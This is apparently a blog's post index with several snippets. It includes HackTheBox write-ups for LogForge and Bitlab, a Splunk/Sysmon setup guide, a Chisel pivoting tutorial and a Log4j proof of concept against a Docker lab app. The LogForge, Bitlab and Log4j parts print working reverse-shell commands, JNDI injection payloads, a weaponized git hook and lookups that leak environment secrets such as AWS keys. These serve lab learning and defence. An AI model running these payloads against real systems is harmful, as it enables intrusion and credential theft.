"snippet": "LogForge is Linux box which introduces Log4j Vulnerability.EnumerationNMAPluka@kali:~/htb/logforge/nmap$ nmap -sC -sV -oA nmap 10.10.11.138Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 20:55 CETNmap scan report for 10.10.11.138Host is up (0.033s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp filtered ftp22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)| 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)|_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Ultimate Hacking Championship|_http-server-header: Apache/2.4.41 (Ubuntu)8080/tcp filtered http-proxyService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWebPage on Port 80Going to page that doesn’t exist shows, that there is difference regarding which server is running on port 80 (Apache or Apache Tomcat), which makes us asume that we’re dealing with reverse proxy.ExploitationSo from very basic enumeration let’s start to exploitation.First on the menu is breaking the parser logic.Breaking parser logic on Apache / Tomcathttps://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdfWe’ll use a neat trick to trick Reverse Proxy to not block us after opening /manager/. We’ll be able to bypass that and still end on Tomcat because tomcat doesn’t treat that ::; as URL.http://10.10.11.138/idontexist/..;/manager/ will open the Login prompt (Login with tomcat/tomcat).We should be able to login to Tomcat manager.Log4J Exploit / CVE-2021/44882There are a lot of good explanations on Log4J, so i’ll won’t be diving into that. I’ve done the PoC before which used simple JNDI payload, which loaded malicious class after LDAP Callback and gave reverse shell.Exploiting Log4J on this box is a little more tricky.First of all, we need to get an execution, so let’s try injecting simple payload into Tomcat.${jndi:ldap://10.10.14.18:1389/Ajej.class}I ran tcpdump but nc listening on port 1389 would also do the job. There’s callback so Application is vulnerable.Like suggested in the ippsec’s video https://www.youtube.com/watch?v=XG14EstTgQ4, approach mention in the post https://twitter.com/marcioalm/status/1470361495405875200 will be used. In addition to that post, we’ll not be using the regular Ysoserial, but Ysoserial-modified: https://github.com/pimps/ysoserial-modifiedJNDI-Exploit-kit: https://github.com/pimps/JNDI-Exploit-Kit.gitCreating payloadjava -jar ysoserial-modified.jar CommonsCollections5 bash &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.18/4444 0&amp;gt;&amp;amp;1&#39; &amp;gt; /home/luka/htb/logforge/revStarting JNDI-Exploit-Kitjava -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.18:1389 -P /home/luka/htb/logforge/revReverse ShellPut ${jndi:ldap://10.10.14.18:1389/rev} again in the manager’s field which gives us RCE and start it. Reverse shell should pop:If the payload wouldn’t work, we could use also one of the following:----------------------------JNDI Links---------------------------- Target environment(Build in JDK 1.8 whose trustURLCodebase is true):rmi://10.10.14.18:1099/s5ie1kldap://10.10.14.18:1389/s5ie1kTarget environment(Build in JDK 1.5 whose trustURLCodebase is true):rmi://10.10.14.18:1099/kfaicpldap://10.10.14.18:1389/kfaicpTarget environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):rmi://10.10.14.18:1099/koifwiTarget environment(Build in JDK 1.6 whose trustURLCodebase is true):rmi://10.10.14.18:1099/2blnimldap://10.10.14.18:1389/2blnimTarget environment(Build in JDK 1.7 whose trustURLCodebase is true):rmi://10.10.14.18:1099/e6xn7gldap://10.10.14.18:1389/e6xn7gTarget environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):rmi://10.10.14.18:1099/urpkwlPrivilege EscalationFTP Server (Java) running as rootroot 769 1 0 Dec24 ? 00:00:00 /usr/sbin/cron -froot 937 769 0 Dec24 ? 00:00:00 \\_ /usr/sbin/CRON -froot 943 937 0 Dec24 ? 00:00:00 \\_ /bin/sh -c /root/run.shroot 944 943 0 Dec24 ? 00:00:00 \\_ /bin/bash /root/run.shroot 945 944 0 Dec24 ? 00:00:59 \\_ java -jar /root/ftpServer-1.0-SNAPSHOT-all.jarUnintended way to solve the box is to log into FTP on localhost with any user, and simple use dir and cat to read the flag etc.Intended way (according to IppSec’s video) is to exploit the vulnerable Log4J FTP Application. We can exploit Log4J simply by putting same string as we did above into the username, and we’d get a callback from an application. Because this app does not have any gadgets, we need to dig deeper into the application.So download the ftp server application to Kali and open it with jd-gui.You should see Log4J decompiled classes right away.In Worker.class we can see user and the pass which will be passed from environment variable. private String validUser = System.getenv(&quot;ftp_user&quot;); private String validPassword = System.getenv(&quot;ftp_password&quot;);Both can be read using JNDI, so let’s try that.${jndi:ldap://10.10.14.18:1389/${env:ftp_user}/${env:ftp_password}}Run tcpdump -i tun0 -A port 1389Somewhere in the middle we should find, leaked username and password:FTP Login should work. We can either grab a flag only or download .ssh/id_rsaExflitration of other DataExfiltration of other data is also possible. This is short list from here: https://therceman.medium.com/log4j-vulnerability-cheatsheet-66b7aeabc607${hostName} ${sys:user.name} ${sys:user.home} ${sys:user.dir} ${sys:java.home} ${sys:java.vendor} ${sys:java.version} ${sys:java.vendor.url} ${sys:java.vm.version} ${sys:java.vm.vendor} ${sys:java.vm.name} ${sys:os.name} ${sys:os.arch} ${sys:os.version} ${env:JAVA_VERSION} ${env:AWS_SECRET_ACCESS_KEY} ${env:AWS_SESSION_TOKEN} ${env:AWS_SHARED_CREDENTIALS_FILE} ${env:AWS_WEB_IDENTITY_TOKEN_FILE} ${env:AWS_PROFILE} ${env:AWS_CONFIG_FILE} ${env:AWS_ACCESS_KEY_ID}For example:${jndi:ldap://10.10.14.18:1389/${hostName}/......./${sys:user.name} /......./${sys:user.dir}/......./${sys:os.version}}" }, { "title": "Bitlab", "url": "/posts/Bitlab/", "categories": "HackTheBox, Linux", "tags": "Linux, C, JavaScript, PHP, API Fuzzing, Arbitrary File Upload, File Misconfiguration", "date": "2021-12-25 10:33:00 +0100", "snippet": "Bitlab - Medium Box running on Linux. GitLab // x32dbg // Debugging / PostGre // git pull // JavaScriptENUMERATIONNMAPSo,… let’s first start NMAP:Nmap scan report for 10.10.10.114Host is up (0.087s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)| 256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)|_ 256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)80/tcp open http nginx| http-robots.txt: 55 disallowed entries (15 shown)| / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit|_http-title: GitLab is not responding (502)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelPort 80 is only interesting port to continue enumeratingGOBUSTERluka@kali:~/htb/bitlab$ gobuster dir -u http://10.10.10.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -k -s 200,204,301,307,401,403===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://10.10.10.114[+] Threads: 50[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt[+] Status codes: 200,204,301,307,401,403[+] User Agent: gobuster/3.0.1[+] Timeout: 10s==============================================================================================================================/help (Status: 301)/profile (Status: 301)/search (Status: 200)/public (Status: 200)/root (Status: 200)Progress: 2541 / 87Checking Webserver manuallySo there to be a bookmark html file that seems like a leakEXPLOITATIONJS Deobfuscation“Gitlab Login” seems to store credentials for Gitlab but the script is obfuscation. Just throwing it into jsnice.org (can be done manually as well!) reveals the password.Credentials work for Gitlab on Port 80GitLab MissconfigurationAfter checking both repositories on GitLab after logging in it seems that “Deployer” repository does few things including sudo git pull.Some IFs have to be met though so let’s do that.Let’s go to Profile repo and create new master branch.Add new File to itPut code inside (PHP)Create merge request next, request merge and merge without making any changes.If everything has been done correctly you should see something like this:And file is also in its place…. and remote execution worksSwap that with reverse shell:And shell was popped:There are two privilege escalation possibilities. One is exploiting that sudo git pull, other one is finishing code found in snippets in GitLab to get clave users credentials. PRIVILEGE ESCALATIONPrivEsc#1: Git pull may be run as sudoLet’s first start with “sudo git pull”I used post-merge hook since that was only one working - pre-commit didn’t work. I didn’t dig deeper to see if pre-commit gets executed or not though.NOTE: since we need to copy whole repository to somewhere where we have write access to, we need to make a change in the repository otherwise pull wont work. So just create a single file like below:Copy the repostiory to /tmp and create a weaponized post-merge hook.cp -r /var/www/html/profile/ /tmp/ echo &#39;#!/bin/bash&#39; &amp;gt; /tmp/profile/.git/hooks/post-mergeecho &#39;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.10/4243 0&amp;gt;&amp;amp;1&quot;&#39; &amp;gt;&amp;gt; /tmp/profile/.git/hooks/post-mergechmod +x /tmp/profile/.git/hooks/post-merge sudo /usr/bin/git pullRoot:PrivEsc#2: PostGRESnippet can be found in GitLab in snippets menu.Code is just missing a line which prints the results.Password with username was retrievedAfter SSHing onto the box with clave, there is file called “RemoteConnection.exe” in the clave’s home directory. I pulled that file to windows and used it with x32dbg. (didn’t work ghidra, or dnspy 64 bit!)PrivEsc#2: x32dbg (retrieving password from the stack)File will put root’s password onto the stack at some point.It works with SSH, i didn’t try to run the file directly :)" }, { "title": "Installing Splunk Enterprise on CentOS 7 and Universal Forwarder on Windows with Sysmon", "url": "/posts/WIN_Series_Install_Splunk/", "categories": "Blogging, Windows_Sec_Splunk_Series", "tags": "Splunk, Sysmon, Logging", "date": "2021-12-25 10:33:00 +0100", "snippet": "In this section i will be installing Splunk Enterprise on CENTOS 7 and Universal Forwarder on Windows. Last part is all about setting up Sysmon on windows machineInstalling Splunk and getting first LogsInstalling Splunk Enterprise on CentOS 7So i will be installing Splunk Enterprise on CentOS7. System has fixed IP address.[luka@localhost ~]$ uname -aLinux localhost.localdomain 3.10.0-1127.el7.x86_64 #1 SMP Tue Mar 31 23:36:51 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux[luka@localhost ~]$(Installing on Debian-based Linux system should not be much different)So let’s grab the Splunk now…Downloading Splunk from splunk.comFor download you will need to login. You can follow Free Splunk Link on https://www.splunk.com/de_de/download/splunk-enterprise.html. You should get to download page eventually:I will be chosing `.rpm` because CentOS is Fedora-based.Uploading Splunk to CentOS 7With Splunk installer on the Disk i will need to transfer it to the actual CentOS system (as Splunk Enterprise was downloaded on Host - Windows machine.)PS C:\\Users\\lukao\\Downloads&amp;gt; scp .\\splunk-8.2.4-87e2dda940d1-linux-2.6-x86_64.rpm luka@192.168.253.221:/tmp/luka@192.168.253.221&#39;s password:splunk-8.2.4-87e2dda940d1-linux-2.6-x86_64.rpm 100% 544MB 43.4MB/s 00:12PS C:\\Users\\lukao\\Downloads&amp;gt;Splunk InstallationLet’s install Splunk on CentOS. (installing as root however splunk will be running under splunk user)[root@localhost splunk]# yum localinstall /tmp/splunk-8.2.4-87e2dda940d1-linux-2.6-x86_64.rpmLoaded plugins: fastestmirrorExamining /tmp/splunk-8.2.4-87e2dda940d1-linux-2.6-x86_64.rpm: splunk-8.2.4-87e2dda940d1.x86_64Marking /tmp/splunk-8.2.4-87e2dda940d1-linux-2.6-x86_64.rpm to be installedResolving Dependencies--&amp;gt; Running transaction check---&amp;gt; Package splunk.x86_64 0:8.2.4-87e2dda940d1 will be installed--&amp;gt; Finished Dependency ResolutionDependencies Resolved===================================================================================================================== Package Arch Version Repository Size=====================================================================================================================Installing: splunk x86_64 8.2.4-87e2dda940d1 /splunk-8.2.4-87e2dda940d1-linux-2.6-x86_64 1.4 GTransaction Summary=====================================================================================================================Install 1 PackageTotal size: 1.4 GInstalled size: 1.4 GIs this ok [y/d/N]: yDownloading packages:..................Do you agree with this license? [y/n]: yThis appears to be your first time running this version of Splunk.Splunk software must create an administrator account during startup. Otherwise, you cannot log in.Create credentials for the administrator account.Characters do not appear on the screen when you type in credentials.Please enter an administrator username: splunkPassword must contain at least: * 8 total printable ASCII character(s).Please enter a new password:Please confirm new password:Copying &#39;/opt/splunk/etc/openldap/ldap.conf.default&#39; to &#39;/opt/splunk/etc/openldap/ldap.conf&#39;.Generating RSA private key, 2048 bit long modulus.......................................+++++...........................+++++e is 65537 (0x10001)writing RSA keyGenerating RSA private key, 2048 bit long modulus.....................+++++..................................................+++++e is 65537 (0x10001)writing RSA keyMoving &#39;/opt/splunk/share/splunk/search_mrsparkle/modules.new&#39; to &#39;/opt/splunk/share/splunk/search_mrsparkle/modules&#39;.Starting Splunk EnterpriseAfter succesfully installing Splunk Enterprise it’s time to start it.[root@localhost splunk]# splunk startSplunk&amp;gt; Australian for grep.Checking prerequisites... Checking http port [8000]: open Checking mgmt port [8089]: open Checking appserver port [127.0.0.1:8065]: open Checking kvstore port [8191]: open Checking configuration... Done. Creating: /opt/splunk/var/run/splunk/appserver/i18n Creating: /opt/splunk/var/run/splunk/appserver/modules/static/css Creating: /opt/splunk/var/run/splunk/upload Creating: /opt/splunk/var/run/splunk/search_telemetry Creating: /opt/splunk/var/spool/splunk Creating: /opt/splunk/var/spool/dirmoncache Creating: /opt/splunk/var/lib/splunk/authDb Creating: /opt/splunk/var/lib/splunk/hashDbNew certs have been generated in &#39;/opt/splunk/etc/auth&#39;. Checking critical directories... Done Checking indexes... Validated: _audit _internal _introspection _metrics _metrics_rollup _telemetry _thefishbucket history main summary Done Checking filesystem compatibility... Done Checking conf files for problems... Done Checking default conf files for edits... Validating installed files against hashes from &#39;/opt/splunk/splunk-8.2.4-87e2dda940d1-linux-2.6-x86_64-manifest&#39; All installed files intact. DoneAll preliminary checks passed.Starting splunk server daemon (splunkd)...Generating a RSA private key..........................+++++....+++++writing new private key to &#39;privKeySecure.pem&#39;-----Signature oksubject=/CN=localhost.localdomain/O=SplunkUserGetting CA Private Keywriting RSA keyDone [ OK ]Waiting for web server at http://127.0.0.1:8000 to be available................. DoneIf you get stuck, we&#39;re here to help.Look for answers here: http://docs.splunk.comThe Splunk web interface is at http://127.0.0.1:8000Now let’s verify if it is really running and if ports are listening:[root@localhost splunk]# ss -antp | grep splunkdLISTEN 0 128 *:8089 *:* users:((&quot;splunkd&quot;,pid=9835,fd=4))LISTEN 0 128 *:8000 *:* users:((&quot;splunkd&quot;,pid=9835,fd=153))Opening Ports on local firewall using IPTablesSo everything’s looking good BUT at least on CentOS 7 i have to allow Ports on local firewall.[luka@localhost ~]$ sudo firewall-cmd --zone=public --add-port=8000/tcp --permanentsuccess[luka@localhost ~]$ sudo firewall-cmd --reloadsuccessChecking if Splunk Web Interface is workingCheck the IP on port 8000 if Splunk is reachable. I’ll be accessing Splunk remotely as CentOS has no GUI installed.Login worked for me with credentials used during installation.So that’s already it. Now we need to fed our Splunk instance with logs. I will use Universal Forwarder on Windows to do that.Set TimeZone for UserSet up timezone in preferences after login.Installing Splunk Universal Forwarder on Windows… the manual way!Universal Forwarder installation on Windows is very straightforward as you will see.Downloading Splunk Universal ForwarderNow let’s move the msi onto the Windows server if needed. Using VMWare Tools it’s even possible to copy/paste files but if that is not possible i’ll include creating share in the end as bonus.Allright! Let’s start with installation.Splunk Universal Forwarder installationLet’s accept the License Agreement and choose on-premises Splunk Enterprise instance.Create UserSet the IP of deployment server (which is local machine)Indexer will be local as well.Installation should be completed at this pointOpening additional Ports on CentOSDon’t forget to open 8089 and 9997 ports on CentOS[luka@localhost ~]$ sudo firewall-cmd --zone=public --add-port=9997/tcp --permanentsuccess[luka@localhost ~]$ sudo firewall-cmd --zone=public --add-port=8089/tcp --permanentsuccess[luka@localhost ~]$ sudo firewall-cmd --reloadsuccessInstallation was relatively straightforward. Configuration of logging itself it will be a bit more challenging. Getting Logs into the SplunkNow as everything has been installed it’s time for configuration.First of all let’s add recieving portAdding recieving portSo first, we need one port where we will recieve the logs. As set previously, i’ll set it to 9997.Configuring IndexNext we’ll need to configure index IF we decide to not send our logs. I’ll use another index for windows logs. I’ve only changed the name and set the retention time to 2 weeks. I might change that if needed.Tweaking inputs.conf on the ClientSo all settings will stay as they are on universal forwarder apart from a file named inputs.conf. Here we’ll define what we want to log. Now for starters let’s just get normal logs onboarded.[WinEventLog://Security] renderXml = true disabled = 0 evt_resolve_ad_obj = true blacklist1 = EventCode=&quot;4662&quot; Message=&quot;Object Type:\\s+(?!groupPolicyContainer)&quot; blacklist2 = EventCode=&quot;566&quot; Message=&quot;Object Type:\\s+(?!groupPolicyContainer)&quot; blacklist3 = EventCode=&quot;4688&quot; Message=&quot;New Process Name: (?i)(?:[C-F]:\\Program Files\\Splunk(?:UniversalForwarder)?\\bin\\(?:btool|splunkd|splunk|splunk-(?:MonitorNoHandle|admon|netmon|perfmon|powershell|regmon|winevtlog|winhostinfo|winprintmon|wmi)).exe)&quot; index = windows_log[WinEventLog://Application] renderXml = true disabled = 0 index = windows_log[WinEventLog://System] renderXml = true disabled = 0 index = windows_logI’ve set index to “windows_log”. The rest should be selfexplainatory. If not check this link https://community.splunk.com/t5/All-Apps-and-Add-ons/How-do-I-collect-basic-Windows-OS-Event-Log-data-from-my-Windows/m-p/440187Restarting SplunkForwarder ServiceIn order to apply custom settings (after changing inputs.conf), service needs to be restarted, so let’s do that and check if SplunkForwarder service is working. We can use “services.msc” for that or powershells Restart-Service (or net start/stop).C:\\&amp;gt;powershell Restart-Service SplunkForwarderWARNING: Waiting for service &#39;SplunkForwarder Service (SplunkForwarder)&#39; to start...WARNING: Waiting for service &#39;SplunkForwarder Service (SplunkForwarder)&#39; to start...WARNING: Waiting for service &#39;SplunkForwarder Service (SplunkForwarder)&#39; to start...C:\\&amp;gt;powershell get-service -Name SplunkForwarderStatus Name DisplayName------ ---- -----------Running SplunkForwarder SplunkForwarder ServiceC:\\&amp;gt;sc query SplunkForwarderSERVICE_NAME: SplunkForwarder TYPE : 10 WIN32_OWN_PROCESS STATE : 4 RUNNING (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0After few seconds, Logs should start popping up in Splunk.Great! Logs are there - if you’re like me than you’d also like to have more granularity on that like seing powershell commands started etc. This can be done using Sysmon which is what we’ll do next.Advanced Windows Logging using SysmonSysmon: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmonSysmonConfig: https://github.com/olafhartong/sysmon-modularInstalling Sysmon ServiceUnpack Sysmon and Sysmon’s config. Import ModulePS C:\\sysmon\\sysmon-modular-master&amp;gt; Import-Module .\\Merge-SysmonXml.ps1 //** ***// ///#(** **%(/// ((&amp;amp;&amp;amp;&amp;amp;** **&amp;amp;&amp;amp;&amp;amp;(( (&amp;amp;&amp;amp;&amp;amp;** ,(((((((. **&amp;amp;&amp;amp;&amp;amp;( ((&amp;amp;&amp;amp;**(((((//(((((((/**&amp;amp;&amp;amp;(( _____ __ __ (&amp;amp;&amp;amp;///((////(((((((///&amp;amp;&amp;amp;( / ___/__ ___________ ___ ____ ____ ____ ___ ____ ____/ /_ __/ /___ ______ &amp;amp;////(/////(((((/(////&amp;amp; \\__ \\/ / / / ___/ __ `__ \\/ __ \\/ __ \\______/ __ `__ \\/ __ \\/ __ / / / / / __ `/ ___/ ((// /////(///// /((( ___/ / /_/ (__ ) / / / / / /_/ / / / /_____/ / / / / / /_/ / /_/ / /_/ / / /_/ / / &amp;amp;(((((#.///////// #(((((&amp;amp; /____/\\__, /____/_/ /_/ /_/\\____/_/ /_/ /_/ /_/ /_/\\____/\\__,_/\\__,_/_/\\__,_/_/ &amp;amp;&amp;amp;&amp;amp;&amp;amp;((#///////((#((&amp;amp;&amp;amp;&amp;amp;&amp;amp; /____/ &amp;amp;&amp;amp;&amp;amp;&amp;amp;(#/***//(#(&amp;amp;&amp;amp;&amp;amp;&amp;amp; &amp;amp;&amp;amp;&amp;amp;&amp;amp;****///&amp;amp;&amp;amp;&amp;amp;&amp;amp; by Olaf Hartong (&amp;amp; ,&amp;amp;. .*&amp;amp;&amp;amp;*.PS C:\\sysmon\\sysmon-modular-master&amp;gt; Merge-AllSysmonXml -Path ( Get-ChildItem &#39;[0-9]*\\*.xml&#39;) -AsString | Out-File sysmonconfig.xmlPS C:\\sysmon\\sysmon-modular-master&amp;gt; .\\Sysmon64.exe -accepteula -i .\\sysmonconfig.xmlSystem Monitor v13.31 - System activity monitorBy Mark Russinovich and Thomas GarnierCopyright (C) 2014-2021 Microsoft CorporationUsing libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.Sysinternals - www.sysinternals.comLoading configuration file with schema version 4.60Sysmon schema version: 4.81Configuration file validated.Sysmon64 installed.SysmonDrv installed.Starting SysmonDrv.SysmonDrv started.Starting Sysmon64..Sysmon64 started.Enabling Audit Logging in MMC (Local Policy - not GPO)Go to MMCPress CTRL+MGo to Group Policy ObjectClick on Finish and OK.Then go to Detailed Tracking.Enable Audit Process CreationEnable Force audit policy subcategory settingsEnable command line in process creation eventsPowershell Module LoggingEnable Powershell Script Block LoggingEnable Task Scheduler LoggingAdd Sysmon to Splunk Forwarder’s inputs.confSo let’s do as title says. Open inputs.conf and ADD following block to the rest of the config that was added before.[WinEventLog://Microsoft-Windows-Sysmon/Operational]checkpointInterval = 5current_only = 0disabled = 0start_from = oldestindex = windows_logRestart the SplunkForwarder service.Logs should be coming into the splunk now.Install Splunk Add-On for Microsoft SysmonDownload from Splunkbase and installLogs should be now visible on Splunk’s SearchThis concludes this chapter. It’s possible to roll this configuration out using GPOs but i’m not confident doing that right now, and i onlyaeNow let’s exploit and hunt!ReferencesIppsec’s video: https://www.youtube.com/watch?v=C2cgvpN44isWindows Docs: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon" }, { "title": "Using Chisel", "url": "/posts/Using_Chisel/", "categories": "Blogging", "tags": "Tunneling, Pivoting", "date": "2021-12-25 10:33:00 +0100", "snippet": "Reverse and Bind Proxy using Chisel // There is no exploitation involved!Lab Setup Kali = 192.168.40.214 Win7 / Pivot#1 Interface#1 = 192.168.40.217 Win7 / Pivot#1 Interface#2 = 192.168.118.176 Linux Server / Pivot#2 interface#1 = 192.168.118.132 Linux Server / Pivot#2 Interface #2 = 192.168.50.129 WebServer = 192.168.50.128Download and InstallationChisel can be downloaded here: https://github.com/jpillora/chiselSimply follow instructions there to download chisel - you will also need GO. Move to the directory where you’ve downloaded the chisel.Build it without debuggo build -ldflags=&quot;-s -w&quot; chiselCompress it even furtherupx brute chiselYou don’t have to build it for Windows if you won’t be using/pivoting windows boxes but here is how it can be done:#x86 versionenv GOOS=windows GOARCH=386 go build -o chisel-x86.exe -ldflags &quot;-s -w&quot;#x64 versionenv GOOS=windows GOARCH=amd64 go build -o chisel-x64.exe -ldflags &quot;-s -w&quot; #(optional - compress it)upx brute ./chisel-x86.exeupx brute ./chisel-x64.exeBind Proxy(Exfiltration Scenario - send data through Pivot#1 (Win7) to Kali where there is no direct access from e.g. corporate network)* This is however just one use caseSo, lets begin setting server on kali:chisel server --host 192.168.40.214 -p 4000You can see above on the right that Port 4000 has been opened on the chisel Server (on Kali) and is listening. This is common to both reverse and bind Proxy.Listener will be opened on the Windows7/Pivot#1 Machinechisel-x86.exe client 192.168.40.214:4000 8001:127.0.0.1:9001Now here is important to understand what the second part of command 8001:127.0.0.1:9001 actually means. Port 8001 has been opened on the Client (Win7 Machine) and is listening on ALL Interfaces (0.0.0.0). Traffic will be relayed to 127.0.0.1:9001 (on the Server - which is Kali)I am now able to send anything to Port 8001 on ANY Interface on the Client/Win7 (192.168.40.217 OR 192.168.118.132 OR 127.0.0.1) on port 8001. This will get piped through the Chisel tunnel to 127.0.0.1 on Kali to portAll that is needed to do is, set a listener on Kali on port 9001I am now able to send anything to Kali over Win7 tunnelReverse Simple Reverse Port Forward / Single PivotThe biggest difference compared to bind proxy is where the listener will reside at, and that is on the server. The tunnel connection will also get initated from the victim/Pivot#1/win7.Lets start chisel server on Kalichisel server --host 192.168.40.214 -p 4000 --reverse… and client on the Win7 which will be 1st Pivot machine. The second part of command R:4001:192.168.118.132:80 also defines where the connection will be proxied to which is 192.168.118.132:80 (Linux Server / Pivot#2). (R: we have to define R for reverse connections)chisel 192.168.40.214:4000 R:4001:192.168.118.132:80The listener is now on Kali - when using Bind Proxy the listener will be on the Client (in my case on Win7/Pivot#1)Test - i am able to reach Linux Server on Port 80 from Kali through Win7/Pivot#1Double Pivot using SOCKSIn order to reach Webserver which is 2 “hops” away i need to pivot through Win7/Pivot#1 and Linux Server/Pivot#2. (i have chisel on both already - there is no Exploitation involved). !Important! - If you can get first pivot setup correctly, setting the 2nd one is basically doing exactly the same BUT keep in mind that you either need more than 1 session (if you’re using SSH / Shell / meterpreter/ whatever) or send chisel processes to background (for example: start-process on window or ampersand in linux).Lets start reverse server with adding –socks5chisel server --host 192.168.40.214 -p 4000 --socks5 --reverseOn Win7/Pivot#1 we have to specify the local listener (which will be on Kali). I used Port 3080Pivot#1And start a server just like we did on KaliOn Pivot#2/Linux Server we start a client but its important to pay attention to listeners interface (192.168.118.176 is Interface on Pivot#1 and will be reachable after Kali connects through the first socks proxy).(again, the listener and its interface will be defined on the client which means - i have to define listener for socky proxy on Pivot#2 for Pivot#1).Lets add following two proxys to /etc/proxychains on Kalisocks5 127.0.0.1 3080socks5 192.168.118.176 7080And i can reach webserver on 192.168.50.128:80|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:3080-&amp;lt;&amp;gt;-192.168.118.176:7080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-192.168.50.128:80-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OKUsing Reverse to download chisel on Pivot#2 from Kali (no direct access)Lets say i want to download something from the Kali (for example the chisel itself) over Pivot#1 which is in my case Win7.Now the roles over server/client are swaped so Pivot#1 (Win7) will be server and Kali will be set as a client.chisel-x86.exe server -p 5000 --reverse # on Pivot#1 (Win7)chisel client 192.168.40.217:5000 4001:127.0.0.1:9001 # on KaliConnection from Linux Server will now go through Pivot#1 (Win7) and if i set a webserver on Kali on port 8000 the file will be downloadedSummary Chisel is a great tool no doubts on that but the message i’d like to put out there is: Practice Pivoting in your own lab because it is easier to troubleshoot if somethings does not work as expected. I used 3 VMs (doesnt really matter if Linux or Windows). " }, { "title": "LOG4J Exploit - Revese Shell (CVE-2021-44228)", "url": "/posts/CVE_2021_44228/", "categories": "Blogging", "tags": "CVE-2021-44228, Log4J", "date": "2021-12-25 10:33:00 +0100", "snippet": "Simple PoC against simple Java Springboot AppSetting up DOCKER “Victim” Java App w. LOG4JDownload the vulnerable App. https://github.com/christophetd/log4shell-vulnerable-app Kudos for making simple app to quickly test PoC! https://github.com/christophetdApp is very simple, based on Java Springboot and includes exactly what we need for PoC: vulnerable log4j (obviously) endpoint that writes to LOG4J log.I chose to run the app in a docker container, basically ran exact commands written by https://github.com/christophetd/log4shell-vulnerable-appgit clone https://github.com/christophetd/log4shell-vulnerable-app`Go into log4shell-vulnerable-app directory and build itdocker build . -t vulnerable-appRun itsudo docker run --name vulnerable-app --network=&quot;bridge&quot; -p 8080:8080 vulnerable-appIf this Victim Server is up and running we can go to Attackers machineAttacker’s Machine - Getting Reverse ShellSimple PoC would just see if there is DNS Request coming bit let’s go one step further.JNDI Exploit will be used https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2 which will run HTTP+LDAP Server.wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zipunzip JNDIExploit.v1.2.zipAt this step of PoC ${jndi:ldap://kali/abc} will be parsed from LOG4J and WILL issue JNDI (Java Naming and Directory Interface) request. JNDI Exploit will inject malicious class and respond to request of Victims server.Let’s start the JNDI Exploit.java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888And let’s craft an malicious reverse shell payload. Since i’m runing the App in docker, there is no bash installed (or at least i didn’t install it manually) - keep that in mind!Payload:echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.253.142 4242 &amp;gt;/tmp/f&quot; | base64 | tr -d &quot;\\n&quot; &amp;amp;&amp;amp; echo(Encode + with %2B)Let’s put payload into Curl and inject it into X-Api-Version header. (It could be any header which get’s logged using Log4J on that application!)curl http://192.168.253.204:8080 -H &#39;X-Api-Version: ${jndi:ldap://192.168.253.142:1389/Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2BJjF8bmMgMTkyLjE2OC4yNTMuMTQyIDQyNDIgPi90bXAvZgo}&#39;If everything has been done right, reverse shell should pop (see tmux window in bottom right) Packet AnalysisAs you can see, there is also no “real” LDAP involed after initial Payload has been sent (i left that part out in the screenshot below.). There’s just TCP and HTTP (what’s missing is DNS - i used IP for my attacker’s machine, therefore no DNS)Java Serialized packet sent to Attacker’s “LDAP” ServerYou can check below, that doesn’t seem like normal LDAP Request does 